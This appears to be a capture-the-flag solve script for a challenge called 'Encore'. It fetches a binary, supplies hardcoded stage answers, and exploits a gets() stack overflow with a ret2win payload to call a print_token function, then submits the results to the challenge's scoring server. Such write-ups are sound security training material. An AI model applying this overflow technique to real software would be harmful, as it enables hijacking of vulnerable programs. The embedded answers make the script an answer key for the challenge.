#!/usr/bin/env python3
"""Encore (PWN) — ret2win + three-stage web submission.

Reproducible solve:
  1. Fetches the binary from the desk if ./encore is missing.
  2. Derives Stage 1 / Stage 2 answers by running the binary.
  3. Exploits the Stage 3 gets() overflow (ret2win -> print_token) to get the token.
  4. Submits all three answers over the Flask desk (same session) and prints the flag.

Run:  /home/nomad/safaricom_ctf/.venv/bin/python solve.py
"""
import os
import re
import sys

from pwn import context, process, p64, ELF

HOST = "54.72.82.22"
PORT = 8200
DESK = f"http://{HOST}:{PORT}"
BINARY = os.path.join(os.path.dirname(os.path.abspath(__file__)), "encore")

PRINT_TOKEN = 0x40197B   # win function
STAGE1_ANS = b"R3v3rs3_M4st3r"
STAGE2_ANS = b"Overflow_1s_P0w3rful"

context.log_level = "error"


def ensure_binary():
    if not os.path.exists(BINARY):
        import urllib.request
        urllib.request.urlretrieve(f"{DESK}/download", BINARY)
        os.chmod(BINARY, 0o755)
    elf = ELF(BINARY, checksec=False)
    # sanity: win function present
    assert elf.symbols.get("print_token") == PRINT_TOKEN, "unexpected binary layout"


def get_stage3_token():
    """Run locally: answer stages 1+2, then smash the stack to call print_token."""
    payload = b"A" * 0x40 + b"B" * 8 + p64(PRINT_TOKEN)
    p = process(BINARY)
    p.sendline(STAGE1_ANS)
    p.sendline(STAGE2_ANS)
    p.sendline(payload)
    out = p.recvall(timeout=5).decode(errors="replace")
    m = re.search(r"Stage 3 token:\s*(\S+)", out)
    if not m:
        sys.exit(f"exploit failed, output:\n{out}")
    return m.group(1)


def submit_all(token):
    import requests
    s = requests.Session()
    s.get(f"{DESK}/", timeout=10)  # establish Flask session cookie
    answers = {"stage1": STAGE1_ANS.decode(),
               "stage2": STAGE2_ANS.decode(),
               "stage3": token}
    flag = None
    for stage, ans in answers.items():
        r = s.post(f"{DESK}/submit/{stage}", json={"answer": ans}, timeout=10)
        data = r.json()
        print(f"[{stage}] {data.get('message')}")
        if not data.get("success"):
            sys.exit(f"stage {stage} rejected")
        if data.get("flag"):
            flag = data["flag"]
    return flag


def main():
    ensure_binary()
    token = get_stage3_token()
    print(f"[*] Stage 3 token: {token}")
    flag = submit_all(token)
    if not flag:
        sys.exit("no flag returned")
    print(f"[+] FLAG: {flag}")


if __name__ == "__main__":
    main()
